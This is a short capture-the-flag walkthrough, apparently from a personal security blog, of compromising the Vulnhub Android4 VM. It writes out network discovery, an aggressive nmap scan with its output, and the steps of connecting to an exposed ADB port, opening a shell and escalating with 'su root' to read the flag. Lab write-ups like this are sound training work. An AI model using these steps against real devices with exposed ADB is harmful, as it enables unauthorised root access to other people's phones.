---
title: Android4 Walkthrough
author: alex
date: Wed 15 Nov 14:15:48 CEST 2023
categories: [Walkthroughs]
tags: [oscp, ctf, walkthroughs, vulnhub]
image:
  path: /assets/img/android.png
  alt: Android Logo.
---

This is going to be a quick one - today I'm hacking into **Android4**! It is an Android-based VM you can compromise in a couple of simple steps using **ADB** or **PhoneSploit**. It is a good VM to start with **ADB**.

## Methodology

1. Reconnaissance
2. Enumeration
3. Exploitation

## Tools Used

1. ADB

## Recon

Let's scan the network to discover our target's IP address:

```bash
sudo netdiscover
```
And here's the output:

```
 Currently scanning: 192.168.10.0/16   |   Screen View: Unique Hosts                                              
                                                                                                                  
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     08:00:27:2d:87:9b      1      60  PCS Systemtechnik GmbH                                         
 192.168.1.52    08:00:27:d6:b0:bb      1      60  PCS Systemtechnik GmbH
```

After getting the IP address of the target we now need to enumerate the target for open ports and protocols. I have used **Nmap** aggressive command for that: 

```bash
sudo nmap -p- -T4 -A -O -v 192.168.1.52
```

And the output...

```
PORT      STATE SERVICE VERSION

5555/tcp  open  adb     Android Debug Bridge device (name: android_x86; model: VirtualBox; device: x86)

8080/tcp  open  http    PHP cli server 5.5 or later
|_http-title: Deface by Good Hackers
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

22000/tcp open  ssh     Dropbear sshd 2014.66 (protocol 2.0)
| ssh-hostkey: 
|   1024 b3:98:65:98:fd:c0:64:fe:16:d6:30:36:aa:2b:ef:6b (DSA)
|   2048 19:e2:9e:6c:c6:8d:af:4e:86:7c:3b:60:91:33:e1:85 (RSA)
|_  521 46:13:43:49:24:88:06:85:6c:75:93:73:b5:1d:8f:28 (ECDSA)

MAC Address: 08:00:27:D6:B0:BB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 49.709 days (since Tue Sep 26 21:45:34 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Android, Linux; CPE: cpe:/o:linux:linux_kernel
```

Here we can see 3 ports but the one that should interest us is **port 5555**: the **ADB port**. Let's fire **ADB** and connect to our target:

```
adb connect 192.168.1.52
```

Now we are connected to the target. Let's open up a shell for us:

```
adb shell
```

And as we can see we get a shell! In order to compromise the VM we just need to change to the root user:

```
su root
```

That easy! Now we can `cat /data/root/flag.txt`:

**ANDROID{u_GOT_root_buddy}**
